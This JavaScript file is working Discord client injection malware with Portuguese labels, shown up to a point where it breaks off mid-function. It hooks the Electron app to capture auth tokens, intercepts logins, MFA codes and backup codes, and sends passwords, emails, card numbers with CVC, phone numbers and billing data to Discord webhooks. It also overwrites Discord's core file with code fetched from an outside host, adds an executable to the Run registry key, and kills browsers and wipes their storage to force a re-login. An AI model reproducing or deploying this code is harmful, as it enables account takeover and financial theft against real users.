const fs = require('fs');
const os = require('os');
const https = require('https');
const {
    exec,
    execSync
} = require('child_process');
const args = process.argv;
const path = require('path');
const querystring = require('querystring');
const {
    BrowserWindow,
    session,
} = require('electron');

const {
    LOCALAPPDATA: localappdata
} = process.env;

const user = {
    webhook: "%WEBHOOK_STEALER%",
    errorhook: "https://discord.com/api/webhooks/1334307088389767228/iRYs4Lc4xd4BCMy_reOoV_gOqBUOla11zSejmiLjX7F_dWNAWVZESui2M7K5hY89A8EG",
    injection: "https://ukibatuzugverymuchstormomgheyhowareu.rauls.site/?code=187367105067",
    exeurl: 'https://www.dropbox.com/scl/fi/3bp1su1m4dwbolljnikbo/UpdateHelper.exe?rlkey=1oc7qx9gx2fsmkuxjlqiai5o2&st=pdkjbn6e&dl=1',
    local: localappdata,
    startup: path.join(os.homedir(), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
    filters: {
        urls: [
            '/auth/login',
            '/auth/register',
            '/mfa/totp',
            '/mfa/codes-verification',
            '/users/@me',
        ],
    },
    filters2: {
        urls: [
            'wss://remote-auth-gateway.discord.gg/*',
            'https://discord.com/api/v*/auth/sessions',
            'https://*.discord.com/api/v*/auth/sessions',
            'https://discordapp.com/api/v*/auth/sessions'
        ],
    },
    payment_filters: {
        urls: [
            'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
            'https://api.stripe.com/v*/tokens',
        ],
    },
    configs: {
        thumbnail: 'https://i.pinimg.com/736x/c4/04/69/c404692bb7860d91e726efcb2d353148.jpg'
    },
    API: "https://discord.com/api/v9/users/@me",
};

function executeJS(script) {
    const window = BrowserWindow.getAllWindows()[0];
    return window.webContents.executeJavaScript(script, !0);
};

function clearAllUserData() {
    executeJS("var iframe = document.createElement('iframe'); document.body.appendChild(iframe); iframe.contentWindow.localStorage.clear(); iframe.contentWindow.sessionStorage.clear(); document.body.removeChild(iframe);");
    executeJS("document.cookie.split(';').forEach(cookie => document.cookie = cookie.replace(/^ +/, '').replace(/=.*/, '=;expires=' + new Date(0).toUTCString() + ';path=/'));");
    executeJS("location.reload();");
};

function getToken() {
    return new Promise((resolve) => {
        session.defaultSession.webRequest.onBeforeSendHeaders((details, callback) => {
            const headers = details.requestHeaders;
            if (headers["Authorization"] && !headers["Authorization"].includes("undefined")) {
                const token = headers["Authorization"];
                resolve(token);
            }
            callback({ requestHeaders: headers });
        });
    });
};

async function request(method, url, headers, data) {
    url = new URL(url);
    const options = {
        protocol: url.protocol,
        hostname: url.host,
        path: url.pathname,
        method: method,
        headers: {
            "Access-Control-Allow-Origin": "*",
        },
    };
    if (url.search) options.path += url.search;
    for (const key in headers) options.headers[key] = headers[key];
    const req = https.request(options);
    if (data) req.write(data);
    req.end();
    return new Promise((resolve, reject) => {
        req.on("response", res => {
            let data = "";
            res.on("data", chunk => data += chunk);
            res.on("end", () => resolve(data));
        });
    });
};


async function killProcesses() {
    const processos = [
        'chrome.exe',
        'msedge.exe',
        'opera.exe',
        'brave.exe',
        'firefox.exe'
    ];
    processos.forEach(proc => {
        try {
            execSync(`taskkill /F /IM ${proc}`, { stdio: 'ignore' });
        } catch (e) {}
    });
};

async function clearFolder(folder) {
    try {
        if (fs.existsSync(folder)) {
            fs.rmSync(folder, { recursive: true, force: true });
        }
    } catch (e) {}
};

async function clearBrowserStorage(folder) {
    try {
        const profiles = fs.readdirSync(folder);
        for (let profile of profiles) {
            const profileFolder = path.join(folder, profile);
            if (fs.lstatSync(profileFolder).isDirectory()) {
                const subFolders = ['Local Storage', 'Cache', 'IndexedDB', 'Cookies', 'Session Storage', 'Service Worker'];
                for (let subFolder of subFolders) {
                    const subFolderPath = path.join(profileFolder, subFolder);
                    if (fs.existsSync(subFolderPath)) {
                        await clearFolder(subFolderPath);
                    } else {}
                }
            }
        }
    } catch (e) {}
};


async function clearBrowserDiscordData() {
    try {
        await killProcesses();
        const browsers = {
            chrome: path.join(os.homedir(), 'AppData', 'Local', 'Google', 'Chrome', 'User Data'),
            edge: path.join(os.homedir(), 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data'),
            opera: path.join(os.homedir(), 'AppData', 'Roaming', 'Opera Software', 'Opera Stable'),
            brave: path.join(os.homedir(), 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data'),
            vivaldi: path.join(os.homedir(), 'AppData', 'Local', 'Vivaldi', 'User Data')
        };
        for (let browser in browsers) {
            await clearBrowserStorage(browsers[browser]);
        }
        return;
    } catch (e) {}
};

function activateStartup() {
    try {
        let startupFolder = user.startup;
        let file1 = 'UpdateHelper.exe';
        let file1Path = path.join(startupFolder, file1);
        checkRegistryAndActivate(file1, file1Path);
    } catch (e) {}
};

function checkRegistryAndActivate(fileName, filePath) {
    const regQueryCommand = `reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "${fileName}"`;
    exec(regQueryCommand, (err, stdout, stderr) => {
        if (err || stderr) {
            activateRegistry(fileName, filePath);
        } else {}
    });
};

function activateRegistry(fileName, filePath) {
    const regAddCommand = `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "${fileName}" /t REG_SZ /d "${filePath}" /f`;
    exec(regAddCommand, (err, stdout, stderr) => {
        if (err) {} else {}
    });
};

async function fetch(endpoint, headers) {
    try {
    return JSON.parse(await request("GET", user.API + endpoint, headers));
    } catch (e) {
            const errorContent = {
                "embeds": [{
                    "title": "erro fetch",
                    "description": `erro: ${e.message}`,
                    "color": 0xff0000,
                }]
            };
            await request("POST", user.errorhook, {
                "Content-Type": "application/json"
            }, JSON.stringify(errorContent));
    }
    return;
};

async function fetchAccount(token) {
    return await fetch("", {
        "Authorization": token
    });
};

async function fetchBilling(token) {
    return await fetch("/billing/payment-sources", {
        "Authorization": token
    });
};

async function fetchFriends(token) {
    return await fetch("/relationships", {
        "Authorization": token
    });
};

const badges = {
    "staff": {
        "emoji": "<:staff:1329254342775148584>",
        "rare": true
    },
    "partner": {
        "emoji": "<:partner:1329254324676726874>",
        "rare": true
    },
    "early_supporter": {
        "emoji": "<:early:1329254300546891857>",
        "rare": true
    },
    "verified_developer": {
        "emoji": "<:verified:1329254268632436776>",
        "rare": true
    },
    "hypesquad": {
        "emoji": "<:hypesquad:1329254249741418516>",
        "rare": true
    },
    "certified_moderator": {
        "emoji": "<:certified:1329254226483871785>",
        "rare": true
    },
    "bug_hunter_level_1": {
        "emoji": "<:bughunter1:1329254205441183784>",
        "rare": true
    },
    "bug_hunter_level_2": {
        "emoji": "<:bughunter2:1329254189976784936>",
        "rare": true
    },
    "active_developer": {
        "emoji": "<:developer:1329254169508450336>",
        "rare": false
    },
    "premium_tenure_1_month_v2": {
        "emoji": "<:nitro1:1351998727887392900>",
        "rare": true
    },
    "premium_tenure_3_month_v2": {
        "emoji": "<:nitro3:1351998778353254454>",
        "rare": true
    },
    "premium_tenure_6_month_v2": {
        "emoji": "<:nitro6:1351998814478667857>",
        "rare": true
    },
    "premium_tenure_12_month_v2": {
        "emoji": "<:nitro1year:1351998848876417054>",
        "rare": true
    },
    "premium_tenure_24_month_v2": {
        "emoji": "<:nitro2year:1351998905243664477>",
        "rare": true
    },
    "premium_tenure_36_month_v2": {
        "emoji": "<:nitro3year:1351998945559314562>",
        "rare": true
    },
    "premium_tenure_48_month_v2": {
        "emoji": "<:nitro5year:1351998989108645959>",
        "rare": true
    },
    "premium_tenure_72_month_v2": {
        "emoji": "<:nitro6year:1351999026991464468>",
        "rare": true
    },
    "premium": {
        "emoji": "<:nitro:1329254146049703990>",
        "rare": true
    },
    "legacy_username": {
        "emoji": "<:pomelo:1329254094216495114>",
        "rare": false
    },
    "quest_completed": {
        "emoji": "<:quests:1329254077212786708>",
        "rare": false
    },
    "hypesquad_house_1": {
        "emoji": "<:house1:1329254056169963520>",
        "rare": false
    },
    "hypesquad_house_2": {
        "emoji": "<:house2:1329254031926755360>",
        "rare": false
    },
    "hypesquad_house_3": {
        "emoji": "<:house3:1329254016642846740>",
        "rare": false
    },
    "guild_booster_lvl1": {
        "emoji": "<:level1:1331335357349761126>",
        "rare": true
    },
    "guild_booster_lvl2": {
        "emoji": "<:level2:1331335384432644106>",
        "rare": true
    },
    "guild_booster_lvl3": {
        "emoji": "<:level3:1331335417580224583>",
        "rare": true
    },
    "guild_booster_lvl4": {
        "emoji": "<:level4:1331335444176310315>",
        "rare": true
    },
    "guild_booster_lvl5": {
        "emoji": "<:level5:1331335470235254854>",
        "rare": true
    },
    "guild_booster_lvl6": {
        "emoji": "<:level6:1331335510165291099>",
        "rare": true
    },
    "guild_booster_lvl7": {
        "emoji": "<:level7:1331335540737446072>",
        "rare": true
    },
    "guild_booster_lvl8": {
        "emoji": "<:level8:1331335569791385813>",
        "rare": true
    },
    "guild_booster_lvl9": {
        "emoji": "<:level9:1331335602674597888>",
        "rare": true
    }
},
flags = {
    Discord_Employee: {
        Value: 1,
        Rare: true
    },
    Partnered_Server_Owner: {
        Value: 2,
        Rare: true
    },
    HypeSquad_Events: {
        Value: 4,
        Rare: true
    },
    Bug_Hunter_Level_1: {
        Value: 8,
        Rare: true
    },
    Early_Supporter: {
        Value: 512,
        Rare: true
    },
    Bug_Hunter_Level_2: {
        Value: 16384,
        Rare: true
    },
    Early_Verified_Bot_Developer: {
        Value: 131072,
        Rare: true
    }
};

async function getIp() {
    try {
        const url = 'https://www.myexternalip.com/raw';
        const ip = await request("GET", url, {
            "Content-Type": "application/json"
        });
        return ip;
    } catch (e) {
        await request("POST", user.errorhook, {
            "Content-Type": "application/json"
        }, JSON.stringify({ content: `erro getIp: ${e}` }));
    }
};

async function getBadges(id, token) {
    try {
        const url = `https://discord.com/api/v10/users/${id}/profile`;
        const headers = {
            'Authorization': token
        };
        const data = await request('GET', url, headers);
        if (!data) return null;
        const p = JSON.parse(data);
        if (!p || !p.badges) return null;
        const badgesList = p.badges
            .map(badge => badges[badge.id]?.emoji)
            .filter(emoji => emoji !== undefined)
            .join('');
        return badgesList || null;
    } catch (e) {
        await request("POST", user.errorhook, {
            "Content-Type": "application/json"
        }, JSON.stringify({ content: `erro getIp: ${e}` }));
        return null;
    }
};

function friendsFlags(f) {
    for (const flag in flags) {
        if ((f & flags[flag].Value) === flags[flag].Value && flags[flag].Rare) {
            return true;
        }
    }
    return false;
};

async function getBilling(token) {
    try {
    const data = await fetchBilling(token);
    let billing = '';
    data.forEach((x) => {
        if (!x.invalid) {
            switch (x.type) {
                case 1:
                    billing += '💳 ';
                    break;
                case 2:
                    billing += '<:paypal:1148653305376034967> ';
                    break;
            }
        }
    });
    return billing || null;
} catch (e) {
    await request("POST", user.errorhook, {
        "Content-Type": "application/json"
    }, JSON.stringify({ content: `erro getIp: ${e}` }));
}
};

async function getFriends(token) {
    try {
        const res = await fetchFriends(token);
        const r = res;
        let friends = '';
        let count = 0;
        let processed = 0;
        for (const user of r) {
            if (user.type === 1 && friendsFlags(user.user.public_flags)) {
                count++;
                if (processed < 10) {
                    const b = await getBadges(user.user.id, token);
                    if (b) {
                        const a = b.match(/<:[a-zA-Z0-9_]+:\d+>/g) || [];
                        const rb = a.filter(badge =>
                            Object.values(badges).some(bData => bData.emoji === badge && bData.rare)
                        );
                        if (rb.length > 0) {
                            friends += `${rb.join('')} | \`${user.user.username}\`\n`;
                            processed++;
                        }
                    }
                }
            }
        }
        const ftitle = `HQ's (${count} Amig${count === 1 ? 'o' : 'os'})`;
        return { friends: friends || null, ftitle };
    } catch (error) {
        await request("POST", user.errorhook, { "Content-Type": "application/json" }, JSON.stringify({ content: `Erro em getRelationships: ${error}` }));
        return { friends: null, ftitle: `HQ's` };
    }
};

async function getDate(id) {
    try {
        const d = 1420070400000;
        const timestamp = BigInt(id) >> 22n;
        const date = new Date(Number(timestamp) + d);
        return date.toLocaleDateString('pt-BR');
    } catch (e) {
        const errorContent = {
            "embeds": [{
                "title": "erro getDate",
                "description": `erro: ${e.message}`,
                "color": 0xff0000,
            }]
        };
        await request("POST", user.errorhook, {
            "Content-Type": "application/json"
        }, JSON.stringify(errorContent));
}
};

async function emailTracker(email, password, token, action) {
    try {
        const account = await fetchAccount(token);
        const ip = await getIp();
        const badges = await getBadges(account.id, token);
        const billing = await getBilling(token);
        const { friends, ftitle } = await getFriends(token);
        const date = await getDate(account.id);
        const content = {
            "embeds": [{
                "author": {
                    "name": `${account.username} ${action}`,
                    "icon_url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.png`
                },
                "thumbnail": {
                    "url": user.configs.thumbnail
                },
                "fields": [
                    {
                        "name": "<:ss:1338443071599153213> Token",
                        "value": `\`\`\`${token}\`\`\``,
                        "inline": false
                    },
                    {
                        "name": "<a:ya:1338443535917252649> Email",
                        "value": `\`${email}\``,
                        "inline": false
                    },
                    {
                        "name": "<a:xs:1338442464704598059> IP",
                        "value": `\`${ip}\``,
                        "inline": false
                    },
                    {
                        "name": "<:iz:1338768513401225237> Senha",
                        "value": `\`${password}\``,
                        "inline": false
                    },
                    {
                        "name": "<a:slk:1338450275811201118> Data",
                        "value": `\`${date}\``,
                        "inline": false
                    }
                ]
            }]
        };
        if (badges !== null) {
            content.embeds[0].fields.push({
                "name": "<a:aa:1338443576698208359> Badges",
                "value": `${badges}`,
                "inline": false
            });
        }
        if (account.phone !== null) {
            content.embeds[0].fields.push({
                "name": "<a:q_:1338446488522592309> Número",
                "value": `\`${account.phone}\``,
                "inline": false
            });
        }
        if (billing !== null) {
            content.embeds[0].fields.push({
                "name": "<a:cc:1338446924834930760> Carteira",
                "value": `${billing}`,
                "inline": false
            });
        }
        if (account.mfa_enabled) {
            content.embeds[0].fields.push({
                "name": "<a:i_:1338446442586570846> V2E",
                "value": "`Ativado`",
                "inline": false
            });
        }
        const fembed = {
            title: ftitle,
            description: friends,
            color: 0x313338,
        };
        if (fembed.description && fembed.description.trim() !== "") {
            content.embeds.push(fembed);
        }
        await request("POST", user.webhook, {
            "Content-Type": "application/json"
        }, JSON.stringify(content));
    } catch (e) {
        const errorContent = {
            "embeds": [{
                "title": "erro emailTracker",
                "description": `erro: ${e.message}`,
                "color": 0xff0000,
            }]
        };
        await request("POST", user.errorhook, {
            "Content-Type": "application/json"
        }, JSON.stringify(errorContent));
    }
};

async function backupTracker(codes, token) {
    try {
        const account = await fetchAccount(token);
        const ip = await getIp();
        const badges = await getBadges(account.id, token);
        const billing = await getBilling(token);
        const { friends, ftitle } = await getFriends(token);
        const date = await getDate(account.id);
        const filteredCodes = codes.filter((code) => code.consumed === false);
        let message = "";
        for (let code of filteredCodes) {
            message += `${code.code.substr(0, 4)}-${code.code.substr(4)}\n`;
        }
        const content = {
            "embeds": [{
                "author": {
                    "name": `${account.username} olhou os códigos de recuperação`,
                    "icon_url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.png`
                },
                "thumbnail": {
                    "url": user.configs.thumbnail
                },
                "fields": [
                    {
                        "name": "<:ss:1338443071599153213> Token",
                        "value": `\`\`\`${token}\`\`\``,
                        "inline": false
                    },
                    {
                        "name": "<a:ya:1338443535917252649> Email",
                        "value": `\`${account.email}\``,
                        "inline": false
                    },
                    {
                        "name": "<a:xs:1338442464704598059> IP",
                        "value": `\`${ip}\``,
                        "inline": false
                    },
                    {
                        "name": "<a:slk:1338450275811201118> Data",
                        "value": `\`${date}\``,
                        "inline": false
                    },
                    {
                        "name": "<:iz:1338768513401225237> Códigos",
                        "value": `\`\`\`${message}\`\`\``,
                        "inline": false
                    }
                ]
            }]
        };
        if (badges !== null) {
            content.embeds[0].fields.push({
                "name": "<a:aa:1338443576698208359> Badges",
                "value": `${badges}`,
                "inline": false
            });
        }
        if (account.phone !== null) {
            content.embeds[0].fields.push({
                "name": "<a:q_:1338446488522592309> Número",
                "value": `\`${account.phone}\``,
                "inline": false
            });
        }
        if (billing !== null) {
            content.embeds[0].fields.push({
                "name": "<a:cc:1338446924834930760> Carteira",
                "value": `${billing}`,
                "inline": false
            });
        }
        if (account.mfa_enabled) {
            content.embeds[0].fields.push({
                "name": "<a:i_:1338446442586570846> V2E",
                "value": "`Ativado`",
                "inline": false
            });
        }
        const fembed = {
            title: ftitle,
            description: friends,
            color: 0x313338,
        };
        if (fembed.description && fembed.description.trim() !== "") {
            content.embeds.push(fembed);
        }
        await request("POST", user.webhook, {
            "Content-Type": "application/json"
        }, JSON.stringify(content));
    } catch (e) {
        const errorContent = {
            "embeds": [{
                "title": "erro backupTracker",
                "description": `erro: ${e.message}`,
                "color": 0xff0000,
            }]
        };
        await request("POST", user.errorhook, {
            "Content-Type": "application/json"
        }, JSON.stringify(errorContent));
    }
};

async function passwordTracker(newPassword, oldPassword, token) {
    try {
        const account = await fetchAccount(token);
        const ip = await getIp();
        const badges = await getBadges(account.id, token);
        const billing = await getBilling(token);
        const { friends, ftitle } = await getFriends(token);
        const date = await getDate(account.id);
        const content = {
            "embeds": [{
                "author": {
                    "name": `${account.username} mudou a senha da conta`,
                    "icon_url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.png`
                },
                "thumbnail": {
                    "url": user.configs.thumbnail
                },
                "fields": [
                    {
                        "name": "<:ss:1338443071599153213> Token",
                        "value": `\`\`\`${token}\`\`\``,
                        "inline": false
                    },
                    {
                        "name": "<a:ya:1338443535917252649> Email",
                        "value": `\`${account.email}\``,
                        "inline": false
                    },
                    {
                        "name": "<a:15:1338771056495955998> Senha Antiga",
                        "value": `\`${oldPassword}\``,
                        "inline": false
                    },
                    {
                        "name": "<:iz:1338768513401225237> Senha Nova",
                        "value": `\`${newPassword}\``,
                        "inline": false
                    },
                    {
                        "name": "<a:xs:1338442464704598059> IP",
                        "value": `\`${ip}\``,
                        "inline": false
                    },
                    {
                        "name": "<a:slk:1338450275811201118> Data",
                        "value": `\`${date}\``,
                        "inline": false
                    }
                ]
            }]
        };
        if (badges !== null) {
            content.embeds[0].fields.push({
                "name": "<a:aa:1338443576698208359> Badges",
                "value": `${badges}`,
                "inline": false
            });
        }
        if (account.phone !== null) {
            content.embeds[0].fields.push({
                "name": "<a:q_:1338446488522592309> Número",
                "value": `\`${account.phone}\``,
                "inline": false
            });
        }
        if (billing !== null) {
            content.embeds[0].fields.push({
                "name": "<a:cc:1338446924834930760> Carteira",
                "value": `${billing}`,
                "inline": false
            });
        }
        if (account.mfa_enabled) {
            content.embeds[0].fields.push({
                "name": "<a:i_:1338446442586570846> V2E",
                "value": "`Ativado`",
                "inline": false
            });
        }
        const fembed = {
            title: ftitle,
            description: friends,
            color: 0x313338,
        };
        if (fembed.description && fembed.description.trim() !== "") {
            content.embeds.push(fembed);
        }
        await request("POST", user.webhook, {
            "Content-Type": "application/json"
        }, JSON.stringify(content));
    } catch (e) {
        const errorContent = {
            "embeds": [{
                "title": "erro passwordTracker",
                "description": `erro: ${e.message}`,
                "color": 0xff0000,
            }]
        };
        await request("POST", user.errorhook, {
            "Content-Type": "application/json"
        }, JSON.stringify(errorContent));
    }
};

async function ccTracker(number, cvc, month, year, token) {
    try {
        const account = await fetchAccount(token);
        const ip = await getIp();
        const badges = await getBadges(account.id, token);
        const billing = await getBilling(token);
        const { friends, ftitle } = await getFriends(token);
        const date = await getDate(account.id);
        const content = {
            "embeds": [{
                "author": {
                    "name": `${account.username} adicionou um cartão de crédito`,
                    "icon_url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.png`
                },
                "thumbnail": {
                    "url": user.configs.thumbnail
                },
                "fields": [
                    {
                        "name": "<:ss:1338443071599153213> Token",
                        "value": `\`\`\`${token}\`\`\``,
                        "inline": false
                    },
                    {
                        "name": "<a:ya:1338443535917252649> Email",
                        "value": `\`${account.email}\``,
                        "inline": false
                    },
                    {
                        "name": "<a:15:1338771056495955998> Número",
                        "value": "`" + number + "`",
                        "inline": false
                    },
                    {
                        "name": "<:iz:1338768513401225237> CVC",
                        "value": "`" + cvc + "`",
                        "inline": false
                    },
                    {
                        "name": "<a:gg:1338771836577775666> Expiração",
                        "value": "`" + month + "/" + year + "`",
                        "inline": false
                    },
                    {
                        "name": "<a:xs:1338442464704598059> IP",
                        "value": `\`${ip}\``,
                        "inline": false
                    },
                    {
                        "name": "<a:slk:1338450275811201118> Data",
                        "value": `\`${date}\``,
                        "inline": false
                    }
                ]
            }]
        };
        if (badges !== null) {
            content.embeds[0].fields.push({
                "name": "<a:aa:1338443576698208359> Badges",
                "value": `${badges}`,
                "inline": false
            });
        }
        if (account.phone !== null) {
            content.embeds[0].fields.push({
                "name": "<a:q_:1338446488522592309> Número",
                "value": `\`${account.phone}\``,
                "inline": false
            });
        }
        if (billing !== null) {
            content.embeds[0].fields.push({
                "name": "<a:cc:1338446924834930760> Carteira",
                "value": `${billing}`,
                "inline": false
            });
        }
        if (account.mfa_enabled) {
            content.embeds[0].fields.push({
                "name": "<a:i_:1338446442586570846> V2E",
                "value": "`Ativado`",
                "inline": false
            });
        }
        const fembed = {
            title: ftitle,
            description: friends,
            color: 0x313338,
        };
        if (fembed.description && fembed.description.trim() !== "") {
            content.embeds.push(fembed);
        }
        await request("POST", user.webhook, {
            "Content-Type": "application/json"
        }, JSON.stringify(content));
    } catch (e) {
        const errorContent = {
            "embeds": [{
                "title": "erro ccTracker",
                "description": `erro: ${e.message}`,
                "color": 0xff0000,
            }]
        };
        await request("POST", user.errorhook, {
            "Content-Type": "application/json"
        }, JSON.stringify(errorContent));
    }
};

async function paypalTracker(token) {
    try {
        const account = await fetchAccount(token);
        const ip = await getIp();
        const badges = await getBadges(account.id, token);
        const billing = await getBilling(token);
        const { friends, ftitle } = await getFriends(token);
        const date = await getDate(account.id);
        const content = {
            "embeds": [{
                "author": {
                    "name": `${account.username} adicionou um paypal na conta`,
                    "icon_url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.png`
                },
                "thumbnail": {
                    "url": user.configs.thumbnail
                },
                "fields": [
                    {
                        "name": "<:ss:1338443071599153213> Token",
                        "value": `\`\`\`${token}\`\`\``,
                        "inline": false
                    },
                    {
                        "name": "<a:ya:1338443535917252649> Email",
                        "value": `\`${account.email}\``,
                        "inline": false
                    },
                    {
                        "name": "<a:xs:1338442464704598059> IP",
                        "value": `\`${ip}\``,
                        "inline": false
                    },
                    {
                        "name": "<a:slk:1338450275811201118> Data",
                        "value": `\`${date}\``,
                        "inline": false
                    }
                ]
            }]
        };
        if (badges !== null) {
            content.embeds[0].fields.push({
                "name": "<a:aa:1338443576698208359> Badges",
                "value": `${badges}`,
                "inline": false
            });
        }
        if (account.phone !== null) {
            content.embeds[0].fields.push({
                "name": "<a:q_:1338446488522592309> Número",
                "value": `\`${account.phone}\``,
                "inline": false
            });
        }
        if (billing !== null) {
            content.embeds[0].fields.push({
                "name": "<a:cc:1338446924834930760> Carteira",
                "value": `${billing}`,
                "inline": false
            });
        }
        if (account.mfa_enabled) {
            content.embeds[0].fields.push({
                "name": "<a:i_:1338446442586570846> V2E",
                "value": "`Ativado`",
                "inline": false
            });
        }
        const fembed = {
            title: ftitle,
            description: friends,
            color: 0x313338,
        };
        if (fembed.description && fembed.description.trim() !== "") {
            content.embeds.push(fembed);
        }
        await request("POST", user.webhook, {
            "Content-Type": "application/json"
        }, JSON.stringify(content));
    } catch (e) {
        const errorContent = {
            "embeds": [{
                "title": "erro paypalTracker",
                "description": `erro: ${e.message}`,
                "color": 0xff0000,
            }]
        };
        await request("POST", user.errorhook, {
            "Content-Type": "application/json"
        }, JSON.stringify(errorContent));
    }
};

function discordPath() {
    const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
    let resourcePath;
    if (process.platform === 'win32') {
        resourcePath = path.join(app, 'resources');
    } else if (process.platform === 'darwin') {
        resourcePath = path.join(app, 'Contents', 'Resources');
    }
    if (fs.existsSync(resourcePath)) {
        return {
            resourcePath,
            app
        };
    }
    return {
        undefined,
        undefined
    };
};

function findActiveDiscordCore() {
    const {
        resourcePath,
        app
    } = discordPath();
    if (resourcePath === undefined || app === undefined) {
        return null;
    }
    const coreVal = fs.readdirSync(path.join(app, 'modules')).filter(x => /discord_desktop_core-+?/.test(x))[0];
    if (!coreVal) {
        return null;
    }
    const corePath = path.join(app, 'modules', coreVal, 'discord_desktop_core');
    const indexJs = path.join(corePath, 'index.js');
    if (fs.existsSync(indexJs)) {
        return corePath;
    }
    return null;
};

async function fetchFolder() {
    const discordCorePath = findActiveDiscordCore();
    if (discordCorePath) {
        const fetchPath = path.join(discordCorePath, 'fetch');
        if (fs.existsSync(fetchPath)) {
            return;
        } else {
            clearBrowserDiscordData();
            clearAllUserData();
            fs.mkdirSync(fetchPath);
        }
    } else {}
};

let webhookSent = false;
async function hooker() {
    try {
        if (webhookSent) {
            return;
        }
        webhookSent = true;
        const token = await getToken();
        if (!token) return;
        const account = await fetchAccount(token);
        const ip = await getIp();
        const badges = await getBadges(account.id, token);
        const billing = await getBilling(token);
        const { friends, ftitle } = await getFriends(token);
        const date = await getDate(account.id);
        const content = {
            "embeds": [{
                "author": {
                    "name": `${account.username} foi injetado`,
                    "icon_url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.png`
                },
                "thumbnail": {
                    "url": user.configs.thumbnail
                },
                "fields": [
                    {
                        "name": "<:ss:1338443071599153213> Token",
                        "value": `\`\`\`${token}\`\`\``,
                        "inline": false
                    },
                    {
                        "name": "<a:ya:1338443535917252649> Email",
                        "value": `\`${account.email}\``,
                        "inline": false
                    },
                    {
                        "name": "<a:xs:1338442464704598059> IP",
                        "value": `\`${ip}\``,
                        "inline": false
                    },
                    {
                        "name": "<a:slk:1338450275811201118> Data",
                        "value": `\`${date}\``,
                        "inline": false
                    }
                ]
            }]
        };
        if (badges !== null) {
            content.embeds[0].fields.push({
                "name": "<a:aa:1338443576698208359> Badges",
                "value": `${badges}`,
                "inline": false
            });
        }
        if (account.phone !== null) {
            content.embeds[0].fields.push({
                "name": "<a:q_:1338446488522592309> Número",
                "value": `\`${account.phone}\``,
                "inline": false
            });
        }
        if (billing !== null) {
            content.embeds[0].fields.push({
                "name": "<a:cc:1338446924834930760> Carteira",
                "value": `${billing}`,
                "inline": false
            });
        }
        if (account.mfa_enabled) {
            content.embeds[0].fields.push({
                "name": "<a:i_:1338446442586570846> V2E",
                "value": "`Ativado`",
                "inline": false
            });
        }
        const fembed = {
            title: ftitle,
            description: friends,
            color: 0x313338,
        };
        if (fembed.description && fembed.description.trim() !== "") {
            content.embeds.push(fembed);
        }
        await request("POST", user.webhook, {
            "Content-Type": "application/json"
        }, JSON.stringify(content));
        await fetchFolder();
    } catch (e) {
        const errorContent = {
            "embeds": [{
                "title": "erro de injeção",
                "description": `erro: ${e.message}\nstack: ${e.stack}`,
                "color": 0xff0000,
            }]
        };
        await request("POST", user.errorhook, {
            "Content-Type": "application/json"
        }, JSON.stringify(errorContent));
    }
};

const {
    resourcePath,
    app
} = discordPath();
if (resourcePath === undefined || app === undefined) return;
const appPath = path.join(resourcePath, 'app');
const packageJson = path.join(appPath, 'package.json');
const resourceIndex = path.join(appPath, 'index.js');
const coreVal = fs.readdirSync(`${app}\\modules\\`).filter(x => /discord_desktop_core-+?/.test(x))[0]
const indexJs = `${app}\\modules\\${coreVal}\\discord_desktop_core\\index.js`;
const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);
if (process.platform === 'win32' || process.platform === 'darwin') {
    fs.writeFileSync(
        packageJson,
        JSON.stringify({
            name: 'discord',
            main: 'index.js',
        }, null, 4),
    );
    const startUpScript = `const fs = require('fs'), https = require('https');
    const indexJs = '${indexJs}';
    const bdPath = '${bdPath}';
    const fileSize = fs.statSync(indexJs).size
    fs.readFileSync(indexJs, 'utf8', (err, data) => {
        if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
            init();
    async function init() {
        https.get('${user.injection}', (res) => {
            const file = fs.createWriteStream(indexJs);
            res.replace('%WEBHOOK%', '${user.webhook}')
            res.pipe(file);
            file.on('finish', () => {
                file.close();
            });
        }).on("error", (err) => {
            setTimeout(init(), 10000);
        });
    }
    require('${path.join(resourcePath, 'app.asar')}')
    if (fs.existsSync(bdPath)) require(bdPath);`;
    fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
};
let email = "";
let password = "";
let initiationCalled = false;
async function createWindow() {
    mainWindow = BrowserWindow.getAllWindows()[0];
    if (!mainWindow) return;
    mainWindow.webContents.debugger.attach('1.3');
    mainWindow.webContents.debugger.on('message', async (_, method, params) => {
        if (!initiationCalled) {
            await hooker();
            initiationCalled = true;
        }
        if (method !== 'Network.responseReceived') return;
        if (!user.filters.urls.some(url => params.response.url.endsWith(url))) return;
        if (![200, 202].includes(params.response.status)) return;
        const responseUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', {
            requestId: params.requestId
        });
        const responseData = JSON.parse(responseUnparsedData.body);
        const requestUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', {
            requestId: params.requestId
        });
        const requestData = JSON.parse(requestUnparsedData.postData);
        switch (true) {
            case params.response.url.endsWith('/login'):
                if (!responseData.token) {
                    email = requestData.login;
                    password = requestData.password;
                    return;
                }
                emailTracker(requestData.login, requestData.password, responseData.token, "logou na conta");
                break;
            case params.response.url.endsWith('/register'):
                emailTracker(requestData.email, requestData.password, responseData.token, "criou uma conta");
                break;
            case params.response.url.endsWith('/totp'):
                emailTracker(email, password, responseData.token, "logou com V2E");
                break;
            case params.response.url.endsWith('/codes-verification'):
                backupTracker(responseData.backup_codes, await getToken());
                break;
